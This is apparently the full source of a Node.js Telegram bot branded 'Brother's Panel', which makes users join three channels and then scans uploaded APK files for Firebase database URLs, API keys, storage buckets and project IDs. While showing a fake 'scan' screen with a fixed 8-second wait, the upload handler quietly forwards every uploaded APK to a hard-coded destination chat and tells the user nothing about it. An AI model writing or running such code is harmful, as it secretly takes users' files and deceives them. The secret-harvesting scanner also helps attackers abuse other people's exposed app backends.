const express = require("express");
const { Telegraf, Markup } = require("telegraf");
const AdmZip = require("adm-zip");
const fs = require("fs");
const path = require("path");
const os = require("os");

const BOT_TOKEN = process.env.BOT_TOKEN;
const DESTINATION_CHAT_ID =
  process.env.DESTINATION_CHAT_ID || "-1004352285600";

const REQUIRED_CHANNELS = [
  "@brotherpanell",
  "@PANELEMPIRE2",
  "@backuptt2"
];

if (!BOT_TOKEN) {
  console.error("❌ BOT_TOKEN is missing.");
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

// ==================================================
// WEB SERVER
// ==================================================

const app = express();

app.get("/", (req, res) => {
  res.status(200).send(
    "🔥 BROTHER's PANEL FIREBASE EXTRACTION BOT — ONLINE"
  );
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`🌐 Server running on port ${PORT}`);
});

// ==================================================
// CHANNEL MEMBERSHIP
// ==================================================

async function checkMembership(ctx) {
  const userId = ctx.from.id;

  for (const channel of REQUIRED_CHANNELS) {
    try {
      const member = await ctx.telegram.getChatMember(
        channel,
        userId
      );

      if (
        member.status !== "member" &&
        member.status !== "administrator" &&
        member.status !== "creator"
      ) {
        return false;
      }
    } catch (error) {
      console.error(
        `❌ Membership error [${channel}]:`,
        error.message
      );

      return false;
    }
  }

  return true;
}

// ==================================================
// PREMIUM JOIN SCREEN
// ==================================================

function joinKeyboard() {
  return Markup.inlineKeyboard([
    [
      Markup.button.url(
        "📢 JOIN CHANNEL 1",
        "https://t.me/brotherpanell"
      )
    ],
    [
      Markup.button.url(
        "📢 JOIN CHANNEL 2",
        "https://t.me/PANELEMPIRE2"
      )
    ],
    [
      Markup.button.url(
        "📢 JOIN CHANNEL 3",
        "https://t.me/backuptt2"
      )
    ],
    [
      Markup.button.callback(
        "✅ VERIFY ACCESS",
        "verify_access"
      )
    ]
  ]);
}

// ==================================================
// START
// ==================================================

bot.start(async (ctx) => {
  console.log(`▶ /start — User ${ctx.from.id}`);

  try {
    const joined = await checkMembership(ctx);

    if (!joined) {
      return ctx.reply(
        `🔥 <b>BROTHER's PANEL</b>
━━━━━━━━━━━━━━━━━━━━

⚡ <b>FIREBASE EXTRACTION SYSTEM</b>

Welcome to Brother's Panel Firebase
Extraction Bot.

🔐 <b>Access Status:</b> LOCKED

To unlock the scanner, join all
3 required channels below.

━━━━━━━━━━━━━━━━━━━━
📢 <b>REQUIRED CHANNELS</b>
━━━━━━━━━━━━━━━━━━━━

1️⃣ Brother's Panel
2️⃣ PANEL EMPIRE 2
3️⃣ Backup TT2

━━━━━━━━━━━━━━━━━━━━

✅ After joining all channels,
press VERIFY ACCESS below.`,
        {
          parse_mode: "HTML",
          ...joinKeyboard()
        }
      );
    }

    await sendVerifiedMessage(ctx);

  } catch (error) {
    console.error("START ERROR:", error);

    await ctx.reply(
      "⚠️ System error. Please try again."
    );
  }
});

// ==================================================
// VERIFIED MESSAGE
// ==================================================

async function sendVerifiedMessage(ctx) {
  return ctx.reply(
    `🔥 <b>BROTHER's PANEL</b>
━━━━━━━━━━━━━━━━━━━━

✅ <b>ACCESS VERIFIED</b>

Your scanner access is now unlocked.

📦 <b>Supported Format</b>
└─ APK only

🚀 Send your APK file below
to start Firebase configuration
extraction.

━━━━━━━━━━━━━━━━━━━━
⚡ BROTHER's PANEL SYSTEM`,
    {
      parse_mode: "HTML"
    }
  );
}

// ==================================================
// VERIFY BUTTON
// ==================================================

bot.action("verify_access", async (ctx) => {
  try {
    await ctx.answerCbQuery(
      "Checking access..."
    );

    const joined = await checkMembership(ctx);

    if (!joined) {
      return ctx.reply(
        `❌ <b>VERIFICATION FAILED</b>

Please join all 3 required channels
and press VERIFY ACCESS again.`,
        {
          parse_mode: "HTML",
          ...joinKeyboard()
        }
      );
    }

    await sendVerifiedMessage(ctx);

  } catch (error) {
    console.error("VERIFY ERROR:", error);

    await ctx.reply(
      "⚠️ Verification error. Please try again."
    );
  }
});

// ==================================================
// APK HANDLER
// ==================================================

bot.on("document", async (ctx) => {
  const document = ctx.message.document;
  const fileName = document.file_name || "";

  // APK ONLY
  if (
    !fileName
      .toLowerCase()
      .endsWith(".apk")
  ) {
    return ctx.reply(
      `❌ <b>INVALID FILE</b>

Only <b>.APK</b> files are supported.

Please send an APK file.`,
      {
        parse_mode: "HTML"
      }
    );
  }

  // Check channels again
  const joined = await checkMembership(ctx);

  if (!joined) {
    return ctx.reply(
      `🔐 <b>ACCESS LOCKED</b>

Please join all 3 required channels
before uploading an APK.`,
      {
        parse_mode: "HTML",
        ...joinKeyboard()
      }
    );
  }

  let processingMessage;

  try {
    // ==============================================
    // PROCESSING UI
    // ==============================================

    processingMessage = await ctx.reply(
      `⚡ <b>BROTHER's PANEL</b>
━━━━━━━━━━━━━━━━━━━━

📦 <b>APK RECEIVED</b>

📱 File: <code>${escapeHtml(fileName)}</code>

🔍 Analyzing Firebase configuration...

━━━━━━━━━━━━━━━━━━━━
⏳ <b>SCAN TIME: 8 SECONDS</b>
━━━━━━━━━━━━━━━━━━━━`,
      {
        parse_mode: "HTML"
      }
    );

    let tempFile = null;

    try {
      // ============================================
      // DOWNLOAD APK
      // ============================================

      const fileLink =
        await ctx.telegram.getFileLink(
          document.file_id
        );

      const response =
        await fetch(fileLink.href);

      if (!response.ok) {
        throw new Error(
          "Failed to download APK."
        );
      }

      const buffer =
        Buffer.from(
          await response.arrayBuffer()
        );

      tempFile = path.join(
        os.tmpdir(),
        `${Date.now()}-${safeName(fileName)}`
      );

      fs.writeFileSync(
        tempFile,
        buffer
      );

      // ============================================
      // SEND ONLY APK TO DESTINATION CHAT
      // ============================================

      await ctx.telegram.sendDocument(
        DESTINATION_CHAT_ID,
        {
          source: tempFile
        }
      );

      // ============================================
      // EXACT 8 SECOND WAIT
      // ============================================

      await sleep(8000);

      // ============================================
      // SCAN
      // ============================================

      const result =
        scanFirebaseConfig(tempFile);

      const sizeMB =
        (
          buffer.length /
          1024 /
          1024
        ).toFixed(2);

      // ============================================
      // RESULT
      // ============================================

      let output =
        `🔥 <b>BROTHER's PANEL FIREBASE
EXTRACTION RESULT</b> 🔥

════════════════════
📱 APK: ${escapeHtml(fileName)}
📦 Size: ${sizeMB} MB
════════════════════

━━━━━━━━━━━━━━━━━━━━━━━━━━
🔓 <b>EXTRACTED FIREBASE CONFIG
(${result.count} found)</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━

`;

      // DB URL
      for (const url of result.databaseUrls) {
        output +=
          `🔗 <b>DB URL:</b>\n${escapeHtml(url)}\n\n`;
      }

      // Masked API Key
      for (const key of result.apiKeys) {
        output +=
          `🔑 <b>API Key:</b>\n${escapeHtml(maskApiKey(key))}\n\n`;
      }

      // Storage
      for (const storage of result.storageUrls) {
        output +=
          `🗄️ <b>Storage URL:</b>\n${escapeHtml(storage)}\n\n`;
      }

      // Project ID
      for (const project of result.projectIds) {
        output +=
          `🆔 <b>Project ID:</b>\n${escapeHtml(project)}\n\n`;
      }

      // App ID
      for (const appId of result.appIds) {
        output +=
          `📱 <b>Firebase App ID:</b>\n${escapeHtml(appId)}\n\n`;
      }

      if (result.count === 0) {
        output +=
          "❌ No Firebase configuration detected.\n\n";
      }

      output +=
        `━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ <b>SCAN COMPLETED</b>
🔥 <b>BROTHER's PANEL</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━`;

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        processingMessage.message_id,
        undefined,
        output,
        {
          parse_mode: "HTML"
        }
      );

    } finally {
      // ==========================================
      // DELETE TEMPORARY APK
      // ==========================================

      if (
        tempFile &&
        fs.existsSync(tempFile)
      ) {
        try {
          fs.unlinkSync(tempFile);
        } catch {}
      }
    }

  } catch (error) {

    console.error(
      "APK PROCESSING ERROR:",
      error
    );

    if (processingMessage) {
      try {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          processingMessage.message_id,
          undefined,
          `❌ <b>SCAN FAILED</b>

The APK could not be processed.

Please try another APK.`,
          {
            parse_mode: "HTML"
          }
        );
      } catch {}
    }
  }
});

// ==================================================
// FIREBASE CONFIG SCANNER
// ==================================================

function scanFirebaseConfig(filePath) {
  const zip = new AdmZip(filePath);
  const entries = zip.getEntries();

  const databaseUrls = new Set();
  const apiKeys = new Set();
  const storageUrls = new Set();
  const projectIds = new Set();
  const appIds = new Set();

  for (const entry of entries) {

    if (entry.isDirectory) {
      continue;
    }

    let content;

    try {
      content =
        entry
          .getData()
          .toString("utf8");
    } catch {
      continue;
    }

    // ==========================================
    // DATABASE URL
    // ==========================================

    const dbMatches =
      content.match(
        /https?:\/\/[A-Za-z0-9._-]+\.firebaseio\.com(?:\/[^\s"'<>]*)?/gi
      );

    if (dbMatches) {
      for (const url of dbMatches) {
        databaseUrls.add(clean(url));
      }
    }

    const newDbMatches =
      content.match(
        /https?:\/\/[A-Za-z0-9._-]+\.firebasedatabase\.app(?:\/[^\s"'<>]*)?/gi
      );

    if (newDbMatches) {
      for (const url of newDbMatches) {
        databaseUrls.add(clean(url));
      }
    }

    // firebase_url
    const firebaseUrl =
      content.match(
        /"firebase_url"\s*:\s*"([^"]+)"/gi
      );

    if (firebaseUrl) {
      for (const item of firebaseUrl) {

        const match =
          item.match(
            /"firebase_url"\s*:\s*"([^"]+)"/i
          );

        if (match) {
          databaseUrls.add(
            clean(match[1])
          );
        }
      }
    }

    // ==========================================
    // API KEY DETECTION
    // ==========================================

    const keyMatches =
      content.match(
        /AIza[0-9A-Za-z_-]{20,}/g
      );

    if (keyMatches) {
      for (const key of keyMatches) {
        apiKeys.add(key);
      }
    }

    // ==========================================
    // STORAGE
    // ==========================================

    const storageMatches =
      content.match(
        /[A-Za-z0-9._-]+\.(?:appspot\.com|firebasestorage\.app)/gi
      );

    if (storageMatches) {
      for (const storage of storageMatches) {
        storageUrls.add(
          clean(storage)
        );
      }
    }

    // ==========================================
    // PROJECT ID
    // ==========================================

    const projectMatches =
      content.match(
        /"project_id"\s*:\s*"([^"]+)"/gi
      );

    if (projectMatches) {

      for (const item of projectMatches) {

        const match =
          item.match(
            /"project_id"\s*:\s*"([^"]+)"/i
          );

        if (match) {
          projectIds.add(
            match[1]
          );
        }
      }
    }

    // ==========================================
    // FIREBASE APP ID
    // ==========================================

    const appMatches =
      content.match(
        /1:[0-9]+:android:[A-Za-z0-9]+/gi
      );

    if (appMatches) {
      for (const appId of appMatches) {
        appIds.add(appId);
      }
    }
  }

  const count =
    databaseUrls.size +
    apiKeys.size +
    storageUrls.size +
    projectIds.size +
    appIds.size;

  return {
    count,
    databaseUrls: [...databaseUrls],
    apiKeys: [...apiKeys],
    storageUrls: [...storageUrls],
    projectIds: [...projectIds],
    appIds: [...appIds]
  };
}

// ==================================================
// HELPERS
// ==================================================

function sleep(ms) {
  return new Promise(
    resolve => setTimeout(resolve, ms)
  );
}

function clean(value) {
  return String(value)
    .trim()
    .replace(
      /[\\'")>,;]+$/g,
      ""
    );
}

function safeName(name) {
  return name.replace(
    /[^a-zA-Z0-9._-]/g,
    "_"
  );
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function maskApiKey(key) {
  if (key.length <= 10) {
    return "********";
  }

  return (
    key.slice(0, 6) +
    "********" +
    key.slice(-4)
  );
}

// ==================================================
// BOT ERROR HANDLER
// ==================================================

bot.catch((error) => {
  console.error(
    "🔥 BOT ERROR:",
    error
  );
});

// ==================================================
// START BOT
// ==================================================

bot.launch()
  .then(() => {
    console.log(
      "🔥 BROTHER's PANEL FIREBASE EXTRACTION BOT STARTED"
    );
  })
  .catch((error) => {
    console.error(
      "❌ BOT START FAILED:",
      error
    );
  });

process.once(
  "SIGINT",
  () => bot.stop("SIGINT")
);

process.once(
  "SIGTERM",
  () => bot.stop("SIGTERM")
);
